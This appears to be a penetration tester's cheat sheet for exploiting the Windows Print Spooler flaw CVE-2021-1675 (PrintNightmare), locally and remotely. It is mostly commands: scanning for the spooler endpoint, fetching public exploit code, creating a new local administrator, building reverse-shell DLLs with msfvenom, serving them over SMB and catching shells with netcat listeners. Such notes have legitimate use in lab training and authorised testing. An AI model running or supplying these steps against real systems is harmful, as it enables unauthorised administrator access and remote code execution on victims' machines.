# Scan

Remote (on attacker machine)

```sh
impacket-rpcdump @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

Local (on target machine)

```powershell
ls \\localhost\pipe\spoolss
```

# Local (easy)

[Github Page](https://github.com/calebstewart/CVE-2021-1675)

Download ps module, transfer it to target machine

```sh
wget https://github.com/calebstewart/CVE-2021-1675/raw/refs/heads/main/CVE-2021-1675.ps1
```

## Exploit

Load module

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
```

> You can either choose to create an admin account, or load a revshell dll. Depends if you wanna clean up or not.

### Create admin account

```powershell
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
```
### Load a malicious dll

First generate a revshell dll

```sh
# Transger this to your target machine btw
msfvenom windows/x64/shell_reverse_tcp -f dll LHOST=tun0 LPORT=9001 -o revshell.dll
```

Stand up `nc` listener

```sh
nc -nvlp 9001
```

Run exploit

```powershell
Invoke-Nightmare -DLL "C:\absolute\path\to\your\revshell.dll"
```

# Remote (require modified `impacket`)

## Clone repo

```sh
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

## Install custom `impacket`

```sh
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

## Generate payload

```sh
mkdir -p /tmp/smb/
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=8080 -f dll -o /tmp/smb/backupscript.dll
```

Host the payload on smb

```sh
sudo smbserver.py -smb2support share /tmp/smb/
```

## Open `nc` listener

```sh
nc -nvlp 8080
```

## Run

```sh
sudo python3 CVE-2021-1675.py "$domain/$user:$pass@$target" '\\<attacker IP>\share\backupscript.dll'
```